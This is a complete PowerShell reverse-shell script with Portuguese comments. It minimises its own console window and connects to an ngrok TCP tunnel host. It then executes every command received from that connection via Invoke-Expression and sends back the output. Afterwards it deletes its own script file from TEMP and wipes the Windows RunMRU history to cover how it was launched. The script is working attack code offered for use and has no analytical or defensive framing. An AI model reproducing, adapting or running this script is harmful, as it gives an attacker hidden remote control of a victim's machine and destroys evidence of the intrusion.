# -----------------------------
# MINIMIZAR JANELA DO POWERSHELL
# -----------------------------
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

$hwnd = [WinAPI]::GetConsoleWindow()
[WinAPI]::ShowWindow($hwnd, 2)  # 2 = Minimizado

# -----------------------------
# CONFIGURAÇÕES NGROK
# -----------------------------
$ngrokHost = "6.tcp.eu.ngrok.io"
$ngrokPort = 16200

# -----------------------------
# CRIAR TCP CLIENTE
# -----------------------------
$client = New-Object System.Net.Sockets.TCPClient
try { $client.Connect($ngrokHost, $ngrokPort) } catch { exit }
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
$writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
$writer.AutoFlush = $true

# -----------------------------
# LOOP PRINCIPAL SEMI-INTERATIVO
# -----------------------------
while ($true) {
    try {
        $command = $reader.ReadLine()
        if ([string]::IsNullOrWhiteSpace($command)) { continue }

        if ($command.Trim().ToLower() -eq "exit") {
            $writer.WriteLine("PowerShell minimizado será encerrado pelo listener.")
            break
        }

        $output = Invoke-Expression $command 2>&1 | Out-String
        $output += "PS " + (Get-Location).Path + "> "
        $writer.WriteLine($output)
    } catch {
        $writer.WriteLine("ERRO: $_`nPS " + (Get-Location).Path + "> ")
    }
}

# -----------------------------
# APAGA O FICHEIRO AO FINAL
# -----------------------------
try { Remove-Item "$env:TEMP\scriptngrok.ps1" -ErrorAction SilentlyContinue } catch {}

# -----------------------------
# LIMPAR HISTÓRICO RUNMRU
# -----------------------------
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name MRUList -ErrorAction SilentlyContinue
    Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" |
        ForEach-Object {
            $_.PSObject.Properties |
            Where-Object { $_.Name -ne '(default)' } |
            ForEach-Object { Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name $_.Name -ErrorAction SilentlyContinue }
        }
} catch {}

# -----------------------------
# ENCERRA POWERHELL AO DIGITAR exit
# -----------------------------
Stop-Process -Id $PID -Force




















